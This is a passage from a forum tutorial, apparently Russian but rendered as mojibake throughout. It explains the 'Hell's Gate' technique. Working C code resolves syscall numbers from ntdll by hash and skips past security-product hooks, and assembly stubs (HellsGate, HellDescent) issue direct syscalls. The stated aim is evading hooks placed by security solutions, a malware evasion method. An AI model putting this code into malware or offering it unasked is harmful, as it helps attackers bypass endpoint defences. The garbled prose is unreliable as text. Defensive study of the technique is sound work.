–ó–∞—Ç–µ–º –¥–ª—è –∫–∞–∂–¥–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ —ç–ª–µ–º–µ–Ω—Ç dwHash –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä—É–µ—Ç—Å—è (–Ω–∞–ø—Ä–∏–º–µ—Ä, NtAllocateVirtualMemory.dwHash) –µ–≥–æ —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–º —Ö–µ—à-–∑–Ω–∞—á–µ–Ω–∏–µ–º. –ü—Ä–∏ –∫–∞–∂–¥–æ–π –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è —Ñ—É–Ω–∫—Ü–∏—è GetVxTableEntry, –∫–æ—Ç–æ—Ä–∞—è –ø–æ–∫–∞–∑–∞–Ω–∞ –Ω–∏–∂–µ. –§—É–Ω–∫—Ü–∏—è —Ä–∞–∑–¥–µ–ª–µ–Ω–∞ –Ω–∞ –Ω–µ—Å–∫–æ–ª—å–∫–æ —á–∞—Å—Ç–µ–π –¥–ª—è —É–ø—Ä–æ—â–µ–Ω–∏—è –ø—Ä–æ—Ü–µ—Å—Å–∞ –æ–±—ä—è—Å–Ω–µ–Ω–∏—è.<br />
<br />
<b>GetVxTableEntry - –ß–∞—Å—Ç—å 1</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BOOL GetVxTableEntry(PVOID pModuleBase, PIMAGE_EXPORT_DIRECTORY pImageExportDirectory, PVX_TABLE_ENTRY pVxTableEntry) {
    PDWORD pdwAddressOfFunctions    = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfFunctions);
    PDWORD pdwAddressOfNames        = (PDWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNames);
    PWORD pwAddressOfNameOrdinales  = (PWORD)((PBYTE)pModuleBase + pImageExportDirectory-&gt;AddressOfNameOrdinals);

    for (WORD cx = 0; cx &lt; pImageExportDirectory-&gt;NumberOfNames; cx++) {
        PCHAR pczFunctionName  = (PCHAR)((PBYTE)pModuleBase + pdwAddressOfNames[cx]);
        PVOID pFunctionAddress = (PBYTE)pModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinales[cx]];

        if (djb2(pczFunctionName) == pVxTableEntry-&gt;dwHash) {
            pVxTableEntry-&gt;pAddress = pFunctionAddress;

            // ...
        }
    }

    return TRUE;
}</code></pre>
	</div>
</div><br />
–ü–µ—Ä–≤–∞—è —á–∞—Å—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ –∏—â–µ—Ç –∑–Ω–∞—á–µ–Ω–∏–µ —Ö–µ—à–∞ Djb2, —Ä–∞–≤–Ω–æ–µ —Ö–µ—à—É —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, pVxTableEntry-&gt;dwHash. –ö–∞–∫ —Ç–æ–ª—å–∫–æ –Ω–∞–π–¥–µ–Ω–æ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ, –∞–¥—Ä–µ—Å —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –±—É–¥–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω –≤ pVxTableEntry-&gt;pAddress. –í—Ç–æ—Ä–∞—è —á–∞—Å—Ç—å —Ñ—É–Ω–∫—Ü–∏–∏ ‚Äî —ç—Ç–æ –º–µ—Å—Ç–æ, –≥–¥–µ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è —Ç—Ä—é–∫ &quot;–í—Ä–∞—Ç –ê–¥–∞&quot;.<br />
<br />
<b>GetVxTableEntry - –ß–∞—Å—Ç—å 2</b><br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>            // –ë—ã—Å—Ç—Ä—ã–π –∏ –≥—Ä—è–∑–Ω—ã–π –∏—Å–ø—Ä–∞–≤–ª–µ–Ω–∏–µ –≤ —Å–ª—É—á–∞–µ, –µ—Å–ª–∏ —Ñ—É–Ω–∫—Ü–∏—è –±—ã–ª–∞ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω–∞
            WORD cw = 0;
            while (TRUE) {
                // –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —ç—Ç–æ —Å–∏—Å—Ç–µ–º–Ω—ã–º –≤—ã–∑–æ–≤–æ–º, –≤ —ç—Ç–æ–º —Å–ª—É—á–∞–µ –º—ã —Å–ª–∏—à–∫–æ–º –¥–∞–ª–µ–∫–æ
                if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
                    return FALSE;

                // –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π –≤–æ–∑–≤—Ä–∞—Ç–∞, –≤ —ç—Ç–æ–º —Å–ª—É—á–∞–µ –º—ã, –≤–µ—Ä–æ—è—Ç–Ω–æ, —Ç–æ–∂–µ —Å–ª–∏—à–∫–æ–º –¥–∞–ª–µ–∫–æ
                if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
                    return FALSE;

                // –ü–µ—Ä–≤—ã–µ –æ–ø–∫–æ–¥—ã –¥–æ–ª–∂–Ω—ã –±—ã—Ç—å:
                //    MOV R10, RCX
                //    MOV RCX, &lt;—Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤&gt;
                if (*((PBYTE)pFunctionAddress + cw) == 0x4c
                    &amp;&amp; *((PBYTE)pFunctionAddress + 1 + cw) == 0x8b
                    &amp;&amp; *((PBYTE)pFunctionAddress + 2 + cw) == 0xd1
                    &amp;&amp; *((PBYTE)pFunctionAddress + 3 + cw) == 0xb8
                    &amp;&amp; *((PBYTE)pFunctionAddress + 6 + cw) == 0x00
                    &amp;&amp; *((PBYTE)pFunctionAddress + 7 + cw) == 0x00) {
                    BYTE high = *((PBYTE)pFunctionAddress + 5 + cw);
                    BYTE low = *((PBYTE)pFunctionAddress + 4 + cw);
                    pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;
                    break;
                }

                cw++;
            };</code></pre>
	</div>
</div><br />
–í—Ç–æ—Ä–∞—è —á–∞—Å—Ç—å –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è —Å —Ü–∏–∫–ª–∞ while –ø–æ—Å–ª–µ –ø–æ–∏—Å–∫–∞ –∞–¥—Ä–µ—Å–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, pFunctionAddress. –¶–∏–∫–ª while –∏—â–µ—Ç –±–∞–π—Ç—ã 0x4c, 0x8b, 0xd1, 0xb8, –∫–æ—Ç–æ—Ä—ã–µ —è–≤–ª—è—é—Ç—Å—è –æ–ø–∫–æ–¥–∞–º–∏ –¥–ª—è –∫–æ–º–∞–Ω–¥ mov r10, rcx –∏ mov rcx, ssn, —è–≤–ª—è—è—Å—å –Ω–∞—á–∞–ª–æ–º –Ω–µ–∏–∑–º–µ–Ω–µ–Ω–Ω–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞.<br />
<br />
–í —Å–ª—É—á–∞–µ, –µ—Å–ª–∏ —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤ –ø–µ—Ä–µ—Ö–≤–∞—á–µ–Ω, –æ–ø–∫–æ–¥—ã –º–æ–≥—É—Ç –Ω–µ —Å–æ–≤–ø–∞–¥–∞—Ç—å –∏–∑-–∑–∞ –¥–æ–±–∞–≤–ª–µ–Ω–∏—è —Ö—É–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–Ω—ã–º–∏ —Ä–µ—à–µ–Ω–∏—è–º–∏ –¥–æ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –ß—Ç–æ–±—ã —É—Å—Ç—Ä–∞–Ω–∏—Ç—å —ç—Ç–æ, &quot;–í—Ä–∞—Ç–∞ –ê–¥–∞&quot; –ø—ã—Ç–∞—é—Ç—Å—è —Å–æ–ø–æ—Å—Ç–∞–≤–∏—Ç—å –æ–ø–∫–æ–¥—ã, –∏ –µ—Å–ª–∏ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ –Ω–µ –Ω–∞–π–¥–µ–Ω–æ, –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è cw –∏–Ω–∫—Ä–µ–º–µ–Ω—Ç–∏—Ä—É–µ—Ç—Å—è, —á—Ç–æ –¥–æ–±–∞–≤–ª—è–µ—Ç –∫ –∞–¥—Ä–µ—Å—É —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –Ω–∞ –ø–æ—Å–ª–µ–¥—É—é—â–µ–π –∏—Ç–µ—Ä–∞—Ü–∏–∏ —Ü–∏–∫–ª–∞. –≠—Ç–æ—Ç –ø—Ä–æ—Ü–µ—Å—Å –ø—Ä–æ–¥–æ–ª–∂–∞–µ—Ç—Å—è, –ø–µ—Ä–µ–º–µ—â–∞—è—Å—å –Ω–∞ –æ–¥–∏–Ω –±–∞–π—Ç –∑–∞ —Ä–∞–∑, –ø–æ–∫–∞ –Ω–µ –¥–æ—Å—Ç–∏–≥–Ω—É—Ç—ã –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–∏ mov r10, rcx –∏ mov rcx, ssn. –ù–∏–∂–µ –ø–æ–∫–∞–∑–∞–Ω–æ, –∫–∞–∫ &quot;–í—Ä–∞—Ç–∞ –ê–¥–∞&quot; –Ω–∞—Ö–æ–¥—è—Ç –æ–ø–∫–æ–¥—ã, –ø–µ—Ä–µ—Ö–æ–¥—è —á–µ—Ä–µ–∑ —Ö—É–∫.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785613385.png"
		data-src="https://osint42.org/attachments/1746785613385-png.211/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785613385-png.211/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785613385.png"
			title="1746785613385.png"
			width="794" height="353" loading="lazy" />
	</div><br />
<br />
<b>–ü—Ä–æ–≤–µ—Ä–∫–∞ –≥—Ä–∞–Ω–∏—Ü—ã</b><br />
<br />
–ß—Ç–æ–±—ã –ø—Ä–µ–¥–æ—Ç–≤—Ä–∞—Ç–∏—Ç—å –¥–∞–ª—å–Ω–∏–π –ø–æ–∏—Å–∫ –∏ –ø–æ–ª—É—á–µ–Ω–∏–µ —Ä–∞–∑–ª–∏—á–Ω–æ–≥–æ SSN –¥–ª—è –¥—Ä—É–≥–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –≤ –Ω–∞—á–∞–ª–µ —Ü–∏–∫–ª–∞ while —Å–¥–µ–ª–∞–Ω—ã –¥–≤–∞ —É—Å–ª–æ–≤–∏—è –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏ –≤–æ–∑–≤—Ä–∞—Ç–∞, —Ä–∞—Å–ø–æ–ª–æ–∂–µ–Ω–Ω—ã—Ö –≤ –∫–æ–Ω—Ü–µ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –ï—Å–ª–∏ –ø–æ–∏—Å–∫ –¥–æ—Å—Ç–∏–≥–∞–µ—Ç –æ–¥–Ω–æ–π –∏–∑ —ç—Ç–∏—Ö –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–π –∏ –æ–ø–∫–æ–¥—ã 0x4c, 0x8b, 0xd1, 0xb8 –Ω–µ –±—ã–ª–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã, –ø–æ–∏—Å–∫ SSN –Ω–µ —É–¥–∞—Å—Ç—Å—è.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>// –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —ç—Ç–æ —Å–∏—Å—Ç–µ–º–Ω—ã–º –≤—ã–∑–æ–≤–æ–º, –≤ —ç—Ç–æ–º —Å–ª—É—á–∞–µ –º—ã —Å–ª–∏—à–∫–æ–º –¥–∞–ª–µ–∫–æ
if (*((PBYTE)pFunctionAddress + cw) == 0x0f &amp;&amp; *((PBYTE)pFunctionAddress + cw + 1) == 0x05)
    return FALSE;

// –ø—Ä–æ–≤–µ—Ä–∏—Ç—å, —è–≤–ª—è–µ—Ç—Å—è –ª–∏ —ç—Ç–æ –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π –≤–æ–∑–≤—Ä–∞—Ç–∞, –≤ —ç—Ç–æ–º —Å–ª—É—á–∞–µ –º—ã, –≤–µ—Ä–æ—è—Ç–Ω–æ, —Ç–æ–∂–µ —Å–ª–∏—à–∫–æ–º –¥–∞–ª–µ–∫–æ
if (*((PBYTE)pFunctionAddress + cw) == 0xc3)
    return FALSE;</code></pre>
	</div>
</div><br />
<b>–í—ã—á–∏—Å–ª–µ–Ω–∏–µ –∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ SSN </b><br />
<br />
–° –¥—Ä—É–≥–æ–π —Å—Ç–æ—Ä–æ–Ω—ã, –µ—Å–ª–∏ –Ω–∞–π–¥–µ–Ω–æ —É—Å–ø–µ—à–Ω–æ–µ —Å–æ–≤–ø–∞–¥–µ–Ω–∏–µ –¥–ª—è –æ–ø–∫–æ–¥–æ–≤, &quot;–í—Ä–∞—Ç–∞ –ê–¥–∞&quot; –±—É–¥—É—Ç –≤—ã—á–∏—Å–ª—è—Ç—å –Ω–æ–º–µ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ –∏ —Å–æ—Ö—Ä–∞–Ω—è—Ç—å –µ–≥–æ –≤ pVxTableEntry-&gt;wSystemCall. –ù–µ –æ–±—è–∑–∞—Ç–µ–ª—å–Ω–æ –ø–æ–Ω–∏–º–∞—Ç—å –≤—ã—á–∏—Å–ª–µ–Ω–∏–µ, –∫–æ—Ç–æ—Ä–æ–µ —Ç—Ä–µ–±—É–µ—Ç –∑–Ω–∞–Ω–∏—è –ø–æ–±–∏—Ç–æ–≤—ã—Ö –æ–ø–µ—Ä–∞—Ç–æ—Ä–æ–≤, –æ–¥–Ω–∞–∫–æ —Ç–µ, –∫—Ç–æ –∑–Ω–∞–∫–æ–º —Å —ç—Ç–∏–º –ø–æ–Ω—è—Ç–∏–µ–º, –º–æ–≥—É—Ç –ø—Ä–æ–¥–æ–ª–∂–∏—Ç—å —á—Ç–µ–Ω–∏–µ —ç—Ç–æ–≥–æ —Ä–∞–∑–¥–µ–ª–∞.<br />
<br />
–§—É–Ω–∫—Ü–∏—è —Å–Ω–∞—á–∞–ª–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –æ–ø–µ—Ä–∞—Ç–æ—Ä —Å–¥–≤–∏–≥–∞ –≤–ª–µ–≤–æ (&lt;&lt;) –¥–ª—è —Å–¥–≤–∏–≥–∞ –±–∏—Ç–æ–≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π high –≤–ª–µ–≤–æ –Ω–∞ 8 —Ä–∞–∑. –ó–∞—Ç–µ–º –æ–Ω–∞ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç –ø–æ–±–∏—Ç–æ–≤—ã–π –æ–ø–µ—Ä–∞—Ç–æ—Ä OR (|) –¥–ª—è —Å—Ä–∞–≤–Ω–µ–Ω–∏—è –∫–∞–∂–¥–æ–≥–æ –±–∏—Ç–∞ –ø–µ—Ä–≤–æ–≥–æ –æ–ø–µ—Ä–∞–Ω–¥–∞ (—è–≤–ª—è—é—â–µ–≥–æ—Å—è high &lt;&lt; 8) —Å —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–º –±–∏—Ç–æ–º –≤—Ç–æ—Ä–æ–≥–æ –æ–ø–µ—Ä–∞–Ω–¥–∞ (—è–≤–ª—è—é—â–µ–≥–æ—Å—è low).<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>pVxTableEntry-&gt;wSystemCall = (high &lt;&lt; 8) | low;</code></pre>
	</div>
</div><br />
–î–ª—è –ª—É—á—à–µ–≥–æ –ø–æ–Ω–∏–º–∞–Ω–∏—è –ø—Ä–∏–≤–µ–¥–µ–Ω –ø—Ä–∏–º–µ—Ä –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ NtProtectVirtualMemory –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏ –ø–æ–¥—Ö–æ–¥–∞ &quot;–í—Ä–∞—Ç –ê–¥–∞&quot; –∫ –≤—ã—á–∏—Å–ª–µ–Ω–∏—é SSN.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785627277.png"
		data-src="https://osint42.org/attachments/1746785627277-png.212/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785627277-png.212/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785627277.png"
			title="1746785627277.png"
			width="977" height="97" loading="lazy" />
	</div><br />
<br />
–ù–∞ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–∏ –≤—ã—à–µ –ø–æ–∫–∞–∑–∞–Ω–æ, –∫–∞–∫ &quot;–í—Ä–∞—Ç–∞ –ê–¥–∞&quot; –Ω–∞—Ö–æ–¥—è—Ç –æ–ø–∫–æ–¥—ã, –ø–µ—Ä–µ—Ö–æ–¥—è —á–µ—Ä–µ–∑ —Ö—É–∫. –≠—Ç–æ –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏–µ —É–ø—Ä–æ—â–µ–Ω–æ –¥–æ —Å–ª–µ–¥—É—é—â–µ–≥–æ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞:<br />
<br />
00007FFCC42C4570 | 4C:8BD1                          | mov r10,rcx                                     |<br />
00007FFCC42C4573 | B8 50000000                   | mov eax,50                                     | 50:&#039;P&#039;<br />
00007FFCC42C4582 | 0F05                                | syscall                                             |<br />
00007FFCC42C4584 | C3                                   | ret                                                   |<br />
<br />
–ë–∞–π—Ç—ã C4C:8BD1 B8 50000000 —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—Ç —Å–ª–µ–¥—É—é—â–∏–º —Å–º–µ—â–µ–Ω–∏—è–º:<br />
<br />
4C –∏–º–µ–µ—Ç —Å–º–µ—â–µ–Ω–∏–µ 0, 8B –∏–º–µ–µ—Ç —Å–º–µ—â–µ–Ω–∏–µ 1 –∏ D1 –∏–º–µ–µ—Ç —Å–º–µ—â–µ–Ω–∏–µ 2, B8 –∏–º–µ–µ—Ç —Å–º–µ—â–µ–Ω–∏–µ 3, 50 –∏–º–µ–µ—Ç —Å–º–µ—â–µ–Ω–∏–µ 4, 00 –∏–º–µ–µ—Ç —Å–º–µ—â–µ–Ω–∏–µ 5 –∏ —Ç–∞–∫ –¥–∞–ª–µ–µ.<br />
–§—É–Ω–∫—Ü–∏—è GetVxTableEntry —É–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ high –∏ low –∏–º–µ—é—Ç —Å–º–µ—â–µ–Ω–∏–µ 5 –∏ 4 —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤–µ–Ω–Ω–æ.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		C:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang="c"><code>BYTE high = *((PBYTE)pFunctionAddress + 5 + cw); // –°–º–µ—â–µ–Ω–∏–µ 5
BYTE low = *((PBYTE)pFunctionAddress + 4 + cw); // –°–º–µ—â–µ–Ω–∏–µ 4</code></pre>
	</div>
</div><br />
–ü—Ä–æ–≤–µ—Ä–∫–∞ –∑–Ω–∞—á–µ–Ω–∏—è —Å–º–µ—â–µ–Ω–∏—è 5 –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç, —á—Ç–æ —ç—Ç–æ 0x00, –≤ —Ç–æ –≤—Ä–µ–º—è –∫–∞–∫ —Å–º–µ—â–µ–Ω–∏–µ 4 —Ä–∞–≤–Ω–æ 0x50. –≠—Ç–æ –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –∑–Ω–∞—á–µ–Ω–∏–µ high —Ä–∞–≤–Ω–æ 0x00, –∞ –∑–Ω–∞—á–µ–Ω–∏–µ low —Ä–∞–≤–Ω–æ 0x50. –¢–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º, SSN —Ä–∞–≤–Ω–æ (0x00 &lt;&lt; 8) | 0x50.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785650036.png"
		data-src="https://osint42.org/attachments/1746785650036-png.214/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785650036-png.214/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785650036.png"
			title="1746785650036.png"
			width="618" height="78" loading="lazy" />
	</div><br />
<br />
–†–µ–∑—É–ª—å—Ç–∞—Ç –ø–æ–±–∏—Ç–æ–≤–æ–π –æ–ø–µ—Ä–∞—Ü–∏–∏ —Å–æ–≤–ø–∞–¥–∞–µ—Ç —Å –Ω–æ–º–µ—Ä–æ–º SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ NtProtectVirtualMemory, –∫–æ—Ç–æ—Ä—ã–π —Ä–∞–≤–µ–Ω 50 –≤ —à–µ—Å—Ç–Ω–∞–¥—Ü–∞—Ç–µ—Ä–∏—á–Ω–æ–π —Å–∏—Å—Ç–µ–º–µ.<br />
<br />
<div class="bbImageWrapper  js-lbImage" title="1746785642122.png"
		data-src="https://osint42.org/attachments/1746785642122-png.213/" data-lb-sidebar-href="" data-lb-caption-extra-html="" data-single-image="1">
		<img src="../../attachments/1746785642122-png.213/index.html"
			data-url=""
			class="bbImage"
			data-zoom-target="1"
			style=""
			alt="1746785642122.png"
			title="1746785642122.png"
			width="977" height="97" loading="lazy" />
	</div><br />
<br />
<b>–í—ã–∑–æ–≤ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞</b><br />
<br />
–¢–µ–ø–µ—Ä—å, –∫–æ–≥–¥–∞ &quot;–í—Ä–∞—Ç–∞ –ê–¥–∞&quot; –ø–æ–ª–Ω–æ—Å—Ç—å—é –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∏—Ä–æ–≤–∞–ª–∏ —Å—Ç—Ä—É–∫—Ç—É—Ä—É VX_TABLE_ENTRY —Ü–µ–ª–µ–≤–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –æ–Ω–∏ –º–æ–≥—É—Ç –≤—ã–∑–≤–∞—Ç—å –µ–≥–æ. –î–ª—è —ç—Ç–æ–≥–æ &quot;–í—Ä–∞—Ç–∞ –ê–¥–∞&quot; –∏—Å–ø–æ–ª—å–∑—É—é—Ç –¥–≤–µ —Ñ—É–Ω–∫—Ü–∏–∏ —Å–±–æ—Ä–∫–∏ 64-–±–∏—Ç: HellsGate –∏ HellDescent, –ø–æ–∫–∞–∑–∞–Ω–Ω—ã–µ –≤ —Ñ–∞–π–ª–µ hellsgate.asm.<br />
<br />

	
	



<div class="bbCodeBlock bbCodeBlock--screenLimited bbCodeBlock--code">
	<div class="bbCodeBlock-title">
		–ö–æ–¥:<button class="copy-button tagItem">–°–∫–æ–ø–∏—Ä–æ–≤–∞—Ç—å –≤ –±—É—Ñ–µ—Ä –æ–±–º–µ–Ω–∞</button>
	</div>
	<div class="bbCodeBlock-content" dir="ltr">
		<pre class="bbCodeCode" dir="ltr" data-xf-init="code-block" data-lang=""><code>data
    wSystemCall DWORD 000h              ; —ç—Ç–æ –≥–ª–æ–±–∞–ª—å–Ω–∞—è –ø–µ—Ä–µ–º–µ–Ω–Ω–∞—è, –∏—Å–ø–æ–ª—å–∑—É–µ–º–∞—è –¥–ª—è —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è SSN —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞

.code
    HellsGate PROC
        mov wSystemCall, 000h
        mov wSystemCall, ecx            ; –æ–±–Ω–æ–≤–ª–µ–Ω–∏–µ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π &#039;wSystemCall&#039; –≤—Ö–æ–¥–Ω—ã–º –∞—Ä–≥—É–º–µ–Ω—Ç–æ–º (–∑–Ω–∞—á–µ–Ω–∏–µ–º —Ä–µ–≥–∏—Å—Ç—Ä–∞ ecx)
        ret
    HellsGate ENDP

    HellDescent PROC
        mov r10, rcx
        mov eax, wSystemCall            ; `wSystemCall` - —ç—Ç–æ SSN –≤—ã–∑—ã–≤–∞–µ–º–æ–≥–æ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞
        syscall
        ret
    HellDescent ENDP
end</code></pre>
	</div>
</div><br />
–ß—Ç–æ–±—ã –≤—ã–∑–≤–∞—Ç—å —Å–∏—Å—Ç–µ–º–Ω—ã–π –≤—ã–∑–æ–≤, —Å–Ω–∞—á–∞–ª–∞ –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–¥–∞—Ç—å –Ω–æ–º–µ—Ä —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞ —Ñ—É–Ω–∫—Ü–∏–∏ HellsGate. –≠—Ç–æ —Å–æ—Ö—Ä–∞–Ω—è–µ—Ç –µ–≥–æ –≤ –≥–ª–æ–±–∞–ª—å–Ω–æ–π –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π wSystemCall –¥–ª—è –±—É–¥—É—â–µ–≥–æ –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è. –ó–∞—Ç–µ–º –∏—Å–ø–æ–ª—å–∑—É–µ—Ç—Å—è HellDescent –¥–ª—è –≤—ã–∑–æ–≤–∞ —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞, –ø–µ—Ä–µ–¥–∞–≤–∞—è –ø–∞—Ä–∞–º–µ—Ç—Ä—ã —Å–∏—Å—Ç–µ–º–Ω–æ–≥–æ –≤—ã–∑–æ–≤–∞. –≠—Ç–æ –¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä—É–µ—Ç—Å—è –≤ —Ñ—É–Ω–∫—Ü–∏–∏ Payload.<br />
<br />
<b>–ó–∞–∫–ª—é—á–µ–Ω–∏–µ</b><br />
<br />
